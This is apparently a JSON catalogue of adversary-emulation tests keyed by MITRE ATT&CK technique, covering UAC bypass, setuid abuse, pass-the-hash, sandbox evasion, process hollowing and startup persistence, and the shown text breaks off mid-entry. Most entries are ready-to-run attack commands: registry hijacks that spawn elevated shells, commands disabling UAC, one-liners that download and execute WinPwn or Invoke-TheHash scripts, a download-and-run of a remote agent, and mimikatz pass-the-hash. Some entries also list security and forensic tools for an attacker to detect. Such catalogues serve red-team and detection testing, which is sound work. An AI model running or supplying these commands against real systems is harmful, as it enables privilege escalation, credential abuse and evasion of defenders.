{
   "T1548.002": {
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Bypasses User Account Control using a fileless method, registry only.\nUpon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe\n[Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\nAdapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n",
            "command": "New-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value 'cmd.exe /c notepad.exe'; New-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"; Start-Process -FilePath $env:windir\\system32\\sdclt.exe; Start-Sleep -s 3"
         },
         {
            "description": "UAC Bypass DccwBypassUAC technique via function of WinPwn",
            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')"
         },
         {
            "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Leo Davidson derivative\n\nType:\tDll Hijack\n\nMethod: IFileOperation\n\nTarget:\t\\system32\\pkgmgr.exe\n\nComponent: DismCore.dll\n\nImplementation:\tucmDismMethod\n\nUCM Method:\tUacMethodDISM\n\nhttps://github.com/hfiref0x/UACME\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\23 Akagi64.exe\""
         },
         {
            "description": "Creates a fake \"trusted directory\" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems\nUpon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch\n",
            "command": "mkdir \"\\\\?\\C:\\Windows \\System32\\\" && copy \"C:\\Windows\\System32\\cmd.exe\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\" && mklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\""
         },
         {
            "description": "UAC bypass using Magic technique via function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); UACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique magic"
         },
         {
            "description": "UAC bypass using DiskCleanup technique via function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); UACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique DiskCleanup"
         },
         {
            "description": "The following UAC bypass is focused on a registry key under \"HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command\" that will trigger a command once wsreset.exe runs. \nThis bypass is limited to Windows 10 1803/1809 and may not run on Server platforms. The registry mod is where interest will be.\nIf successful, the command to run will spawn off wsreset.exe. \n[UAC Bypass in Windows 10 Store Binary](https://0x1.gitlab.io/exploit/UAC-Bypass-in-Windows-10-Store-Binary/)\n",
            "command": "New-Item HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Force | Out-Null; New-ItemProperty -Path HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Name \"DelegateExecute\" -Value \"\" -Force | Out-Null; Set-ItemProperty -Path HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe /c start cmd.exe\" -Force -ErrorAction SilentlyContinue | Out-Null; $Process = Start-Process -FilePath \"C:\\Windows\\System32\\WSReset.exe\" -WindowStyle Hidden"
         },
         {
            "description": "PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10\nUpon execution administrative command prompt should open\n",
            "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force; New-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force; Set-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force; Start-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\""
         },
         {
            "description": "Disable User Account Conrol (UAC) for admin by setting the registry key \nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ConsentPromptBehaviorAdmin to 0.\n\n[MedusaLocker Ransomware](https://cloudsek.com/technical-analysis-of-medusalocker-ransomware/), \n[Purple Fox Rootkit](https://blogs.blackberry.com/en/2022/01/threat-thursday-purple-fox-rootkit), \n[Avaddon Ransomware](https://blogs.blackberry.com/en/2021/06/threat-thursday-avaddon-ransomware-uses-ddos-attacks-as-triple-threat)\n",
            "command": "$orgValue =(Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin; Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force"
         },
         {
            "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tShell API\n\nMethod: Environment variables expansion\n\nTarget:\t\\system32\\svchost.exe via \\system32\\schtasks.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDiskCleanupEnvironmentVariable\n\nUCM Method:\tUacMethodDiskSilentCleanup\n\nhttps://github.com/hfiref0x/UACME\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\34 Akagi64.exe\""
         },
         {
            "description": "PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privalages\n",
            "command": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force; Set-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force; Start-Process \"C:\\Windows\\System32\\eventvwr.msc\""
         },
         {
            "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tAppInfo ALPC\n\nMethod: RAiLaunchAdminProcess and DebugObject\n\nTarget:\tAttacker defined\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDebugObjectMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\59 Akagi64.exe\""
         },
         {
            "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\sdclt.exe\n\nComponent: Attacker defined\n\nImplementation:\tucmSdcltIsolatedCommandMethod\n\nUCM Method:\tUacMethodShellSdclt\n\nhttps://github.com/hfiref0x/UACME\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\31 Akagi64.exe\""
         },
         {
            "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Hashim Jawad\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\WSReset.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodShellWSReset\n\nhttps://github.com/hfiref0x/UACME\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\56 Akagi64.exe\""
         },
         {
            "description": "Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privileges. \n",
            "command": "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f && cmd.exe /c eventvwr.msc"
         },
         {
            "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: winscripting.blog\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\fodhelper.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodMsSettings2\n\nhttps://github.com/hfiref0x/UACME\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\33 Akagi64.exe\""
         },
         {
            "description": "Bypass UAC using SilentCleanup task on Windows 8-10 using bat file from https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/\n\nThere is an auto-elevated task called SilentCleanup located in %windir%\\system32\\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC (even highest level).\n\nFor example, we can set the windir registry kye to: \"cmd /k REM \"\n\nAnd forcefully run SilentCleanup task:\n\nschtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I\n\nREM will tell it to ignore everything after %windir% and treat it just as a NOTE. Therefore just executing cmd with admin privs.\n",
            "command": "\"bc40cf_T1548.002.bat\""
         },
         {
            "description": "Disable User Account Conrol (UAC) using the builtin tool reg.exe by changing its registry key\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA from 1 to 0\n",
            "command": "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f"
         },
         {
            "description": "Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution, \"The operation completed successfully.\" will be shown twice and command prompt will be opened.\n",
            "command": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f && reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f && fodhelper.exe"
         },
         {
            "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3/bytecode77 derivative by Nassim Asrir\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\slui.exe, \\system32\\changepk.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\61 Akagi64.exe\""
         },
         {
            "description": "User Account Control (UAC) is a security mechanism for limiting the elevation of privileges, including administrative accounts, unless authorized. \nThis setting ensures that the elevation prompt is only used in secure desktop mode.\nDisable User Account Conrol (UAC) for secure desktop by setting the registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\PromptOnSecureDesktop to 0.\n",
            "command": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force"
         },
         {
            "description": "UAC bypass using ccmstp technique via function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); UACBypass -noninteractive -command \"C:\\windows\\system32\\calc.exe\" -technique ccmstp"
         },
         {
            "description": "PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution command prompt will be opened.\n",
            "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force; New-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force; Set-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force; Start-Process \"C:\\Windows\\System32\\fodhelper.exe\""
         },
         {
            "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Stefan Kanthak\n\nType:\tDll Hijack\n\nMethod: .NET Code Profiler\n\nTarget:\t\\system32\\mmc.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmCorProfilerMethod\n\nUCM Method:\tUacMethodCorProfiler\n\nhttps://github.com/hfiref0x/UACME\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\39 Akagi64.exe\""
         },
         {
            "description": "UIPI bypass with uiAccess application",
            "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$wc.Headers.add(\"defaultSleep\",\"60\");\n$wc.Headers.add(\"defaultGroup\",\"bypassed_u_bro\");\n$data=$wc.DownloadData($url);\n$name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\");\n[io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n.\\Akagi64.exe 32 \"C:\\Users\\Public\\$name.exe -server #{server}\"\n"
         },
         {
            "description": "Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe",
            "command": ".\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe\n"
         },
         {
            "description": "executes the slui exe file handler hijack",
            "command": ".\\Akagi64.exe 45 C:\\Windows\\System32\\cmd.exe\n"
         },
         {
            "description": "Set a registry key to allow UAC bypass",
            "command": "New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force\n"
         },
         {
            "description": "Bypass user account controls - medium",
            "command": "$url=\"#{server}/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"); [io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command \"C:\\Users\\Public\\$name.exe -group #{group}\"; };\nReceive-Job -Job $job -Wait;\n"
         }
      ]
   },
   "T1548.001": {
      "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "This test simulates a command that can be run to enumerate files that have the setuid bit set\n",
            "command": "find /usr/bin -perm -4000"
         },
         {
            "description": "This test gives a file the capability to set UID without using flags.\n",
            "command": "touch /tmp/evilBinary; sudo setcap cap_setuid=ep /tmp/evilBinary"
         },
         {
            "description": "Make, change owner, and change file attributes on a C source code file\n",
            "command": "cp; sudo chown root /tmp/hello.c; sudo make /tmp/hello; sudo chown root /tmp/hello; sudo chmod u+s /tmp/hello; /tmp/hello"
         },
         {
            "description": "This test sets the SetUID flag on a file in Linux and macOS.\n",
            "command": "sudo touch /tmp/evilBinary; sudo chown root /tmp/evilBinary; sudo chmod u+xs /tmp/evilBinary"
         },
         {
            "description": "This test simulates a command that can be run to enumerate files that have the setgid bit set\n",
            "command": "find /usr/bin -perm -2000"
         },
         {
            "description": "Make and modify [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) of a C source code file.\nThe binary doesn't have to modify the UID, but the binary is given the capability to arbitrarily modify it at any time with `setuid(0)`.\nWithout being owned by root, the binary can set the UID to 0.\n",
            "command": "cp; make /tmp/cap; sudo setcap cap_setuid=ep /tmp/cap; /tmp/cap"
         },
         {
            "description": "This test sets the SetGID flag on a file in Linux and macOS.\n",
            "command": "sudo touch /tmp/evilBinary; sudo chown root /tmp/evilBinary; sudo chmod g+xs /tmp/evilBinary"
         }
      ]
   },
   "T1550.002": {
      "technique_name": "Use Alternate Authentication Material: Pass the Hash",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "command execute with crackmapexec\n",
            "command": "C:\\CrackMapExecWin\\crackmapexec.exe %userdnsdomain% -u Administrator -H cc36cf7a8514893efccd3324464tkg1a -x whoami"
         },
         {
            "description": "Note: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)\n",
            "command": "%tmp%\\mimikatz\\x64\\mimikatz.exe \"sekurlsa::pth /user:Administrator /domain:%userdnsdomain% /ntlm:cc36cf7a8514893efccd3324464tkg1a\""
         },
         {
            "description": "Use Invoke-WMIExec to Pass the Hash\nNote: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname"
         }
      ]
   },
   "T1497.001": {
      "technique_name": "Virtualization/Sandbox Evasion: System Checks",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "Windows Management Instrumentation(WMI) objects contain system information which helps to detect virtualization. This test will get the model and manufacturer of the machine to determine if it is a virtual machine, such as through VMware or VirtualBox. \n",
            "command": "$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Manufacturer\"; $Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Model\"; if((($Manufacturer.ToLower() -eq \"microsoft corporation\") -and ($Model.ToLower().contains(\"virtual\"))) -or ($Manufacturer.ToLower().contains(\"vmware\")) -or ($Model.ToLower() -eq \"virtualbox\")) {write-host \"Virtualization environment detected!\"} else {write-host \"No virtualization environment detected!\"}"
         },
         {
            "description": "Windows Management Instrumentation(WMI) objects contains system information which helps to detect virtualization. This command will specifically attempt to get the CurrentTemperature value from this object and will check to see if the attempt results in an error that contains the word supported. This is meant to find the result of Not supported, which is the result if run in a virtual machine\n",
            "command": "$error.clear(); Get-WmiObject -Query \"SELECT * FROM MSAcpi_ThermalZoneTemperature\" -ErrorAction SilentlyContinue; if($error) {echo \"Virtualization Environment detected\"}"
         },
         {
            "description": "ioreg contains registry entries for all the device drivers in the system. If it's a virtual machine, one of the device manufacturer will be a Virtualization Software.\n",
            "command": "if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi; "
         },
         {
            "description": "systemd-detect-virt detects execution in a virtualized environment.\nAt boot, dmesg stores a log if a hypervisor is detected.\n",
            "command": "if (systemd-detect-virt) then echo \"Virtualization Environment detected\"; fi; if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo \"Virtualization Environment detected\"; fi; "
         },
         {
            "description": "Determine if the system is virtualized or physical",
            "command": "get-wmiobject win32_computersystem | fl model\n"
         },
         {
            "description": "Check for security services. Security service list is based on the SUNBURST malware observed in a Solarwinds related compromise (https://research.checkpoint.com/2020/sunburst-teardrop-and-the-netsec-new-normal/).",
            "command": "$securityServices = @(\n    \"msmpeng\",\n    \"windefend\",\n    \"mssense\",\n    \"sense\",\n    \"microsoft.tri.sensor\",\n    \"microsoft.tri.sensor.updater\",\n    \"cavp\",\n    \"cb\",\n    \"carbonblack\",\n    \"carbonblackk\",\n    \"cbcomms\",\n    \"cbstream\",\n    \"csfalconservice\",\n    \"csfalconcontainer\",\n    \"csagent\",\n    \"csdevicecontrol\",\n    \"csfalconservice\",\n    \"xagt\",\n    \"xagtnotif\",\n    \"fe_avk\",\n    \"fekern\",\n    \"feelam\",\n    \"fewscservice\",\n    \"ekrn\",\n    \"eguiproxy\",\n    \"egui\",\n    \"eamonm\",\n    \"eelam\",\n    \"ehdrv\",\n    \"ekrnepfw\",\n    \"epfwwfp\",\n    \"ekbdflt\",\n    \"epfw\",\n    \"fsgk32st\",\n    \"fswebuid\",\n    \"fsgk32\",\n    \"fsma32\",\n    \"fssm32\",\n    \"fnrb32\",\n    \"fsaua\",\n    \"fsorsp\",\n    \"fsav32\",\n    \"f-secure gatekeeper handler starter\",\n    \"f-secure network request broker\",\n    \"f-secure webui daemon\",\n    \"fsma\",\n    \"fsorspclient\",\n    \"f-secure gatekeeper\",\n    \"f-secure hips\",\n    \"fsbts\",\n    \"fsni\",\n    \"fsvista\",\n    \"f-secure filter\",\n    \"f-secure recognizer\",\n    \"fses\",\n    \"fsfw\",\n    \"fsdfw\",\n    \"fsms\",\n    \"fsdevcon\"\n);\n\n$currentServices = Get-Service | Select-Object -Property Name;\nforeach ($svc in $currentServices) {\n    foreach ($secSvc in $securityServices) {\n        if ($svc.Name -like $secSvc) {\n            $svcDetails = Get-Service -name $svc.Name | Select-Object -Property Name, DisplayName, Status;\n            Write-Host \"[!] Security service found:\";\n            Write-Host \"    Service Name:`t\", $svcDetails.Name;\n            Write-Host \"    Display Name:`t\", $svcDetails.DisplayName;\n            Write-Host \"    Status:`t`t\", $svcDetails.Status;\n            Write-Host \"\";\n        }\n    }\n}\n"
         },
         {
            "description": "Check for analysis/sandbox environment processes. Process black list is based on the SUNBURST malware observed in a Solarwinds related compromise (https://research.checkpoint.com/2020/sunburst-teardrop-and-the-netsec-new-normal/).",
            "command": "$forensicProcesses = @(\n    \"apimonitor-x64\",\n    \"apimonitor-x86\",\n    \"autopsy64\",\n    \"autopsy\",\n    \"autoruns64\",\n    \"autoruns\",\n    \"autorunsc64\",\n    \"autorunsc\",\n    \"binaryninja\",\n    \"blacklight\",\n    \"cff explorer\",\n    \"cutter\",\n    \"de4dot\",\n    \"debugview\",\n    \"diskmon\",\n    \"dnsd\",\n    \"dnspy\",\n    \"dotpeek32\",\n    \"dotpeek64\",\n    \"dumpcap\",\n    \"evidence center\",\n    \"exeinfope\",\n    \"fakedns\",\n    \"fakenet\",\n    \"ffdec\",\n    \"fiddler\",\n    \"fileinsight\",\n    \"floss\",\n    \"gdb\",\n    \"hiew32demo\",\n    \"hiew32\",\n    \"hollows_hunter\",\n    \"idaq64\",\n    \"idaq\",\n    \"idr\",\n    \"ildasm\",\n    \"ilspy\",\n    \"jd-gui\",\n    \"lordpe\",\n    \"officemalscanner\",\n    \"ollydbg\",\n    \"pdfstreamdumper\",\n    \"pe-bear\",\n    \"pebrowse64\",\n    \"peid\",\n    \"pe-sieve32\",\n    \"pe-sieve64\",\n    \"pestudio\",\n    \"peview\",\n    \"ppee\",\n    \"procdump64\",\n    \"procdump\",\n    \"processhacker\",\n    \"procexp64\",\n    \"procexp\",\n    \"procmon\",\n    \"prodiscoverbasic\",\n    \"py2exedecompiler\",\n    \"r2agent\",\n    \"rabin2\",\n    \"radare2\",\n    \"ramcapture64\",\n    \"ramcapture\",\n    \"reflector\",\n    \"regmon\",\n    \"resourcehacker\",\n    \"retdec-ar-extractor\",\n    \"retdec-bin2llvmir\",\n    \"retdec-bin2pat\",\n    \"retdec-config\",\n    \"retdec-fileinfo\",\n    \"retdec-getsig\",\n    \"retdec-idr2pat\",\n    \"retdec-llvmir2hll\",\n    \"retdec-macho-extractor\",\n    \"retdec-pat2yara\",\n    \"retdec-stacofin\",\n    \"retdec-unpacker\",\n    \"retdec-yarac\",\n    \"rundotnetdll\",\n    \"sbiesvc\",\n    \"scdbg\",\n    \"scylla_x64\",\n    \"scylla_x86\",\n    \"shellcode_launcher\",\n    \"solarwindsdiagnostics\",\n    \"sysmon64\",\n    \"sysmon\",\n    \"task explorer\",\n    \"task explorer-x64\",\n    \"tcpdump\",\n    \"tcpvcon\",\n    \"tcpview\",\n    \"vboxservice\",\n    \"win32_remote\",\n    \"win64_remotex64\",\n    \"windbg\",\n    \"windump\",\n    \"winhex64\",\n    \"winhex\",\n    \"winobj\",\n    \"wireshark\",\n    \"x32dbg\",\n    \"x64dbg\",\n    \"xwforensics64\",\n    \"xwforensics\",\n    \"redcloak\",\n    \"avgsvc\",\n    \"avgui\",\n    \"avgsvca\",\n    \"avgidsagent\",\n    \"avgsvcx\",\n    \"avgwdsvcx\",\n    \"avgadminclientservice\",\n    \"afwserv\",\n    \"avastui\",\n    \"avastsvc\",\n    \"aswidsagent\",\n    \"aswidsagenta\",\n    \"aswengsrv\",\n    \"avastavwrapper\",\n    \"bccavsvc\",\n    \"psanhost\",\n    \"psuaservice\",\n    \"psuamain\",\n    \"avp\",\n    \"avpui\",\n    \"ksde\",\n    \"ksdeui\",\n    \"tanium\",\n    \"taniumclient\",\n    \"taniumdetectengine\",\n    \"taniumendpointindex\",\n    \"taniumtracecli\",\n    \"taniumtracewebsocketclient64\"\n);\n\nfunction Find-ForensicProcesses {\n    param (\n        $ForensicProcessList\n    );\n    $CurrentProcesses = Get-Process | Sort-Object | Select-Object -Property Name | Get-Unique -AsString;\n    foreach ($proc in $CurrentProcesses) {\n        foreach ($forensicProc in $ForensicProcessList) {\n            if ($proc.name -like $forensicProc) {\n                $procPath = Get-Process -Name $proc.Name | Sort-Object | Select-Object -Property Path | Get-Unique;\n                Write-Host \"[!] Forensic process found: \" $proc.Name;\n                Write-Host \"[!] Path: \" $procPath.Path;\n            }\n        }\n    }\n}\n\nFind-ForensicProcesses($forensicProcesses);"
         }
      ]
   },
   "T1055.012": {
      "technique_name": "Process Injection: Process Hollowing",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.\nCredit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)\n",
            "command": ". \"C:\\Users\\puma-4\\Desktop\\Start-Hollow.ps1\"; $ppid=Get-Process explorer | select -expand id; Start-Hollow -Sponsor \"C:\\Windows\\System32\\notepad.exe\" -Hollow \"C:\\Windows\\System32\\cmd.exe\" -ParentPID $ppid -Verbose"
         },
         {
            "description": "This module executes notepad.exe from within the WINWORD.EXE process\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) ; Invoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"Word\" -sub \"Exploit\""
         }
      ]
   },
   "T1547.001": {
      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "tactic": "multiple",
      "known implementations": [
         {
            "description": "bat files can be placed in and executed from the startup folder to maintain persistance\n\nUpon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
            "command": "Copy-Item \"C:\\Users\\puma-4\\Desktop\\batstartup.bat\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"; Copy-Item \"C:\\Users\\puma-4\\Desktop\\batstartup.bat\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"; Start-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"; Start-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\""
         },
         {
            "description": "jse files can be placed in and ran from the startup folder to maintain persistance.\nUpon execution, \"T1547.001 Hello, World JSE!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
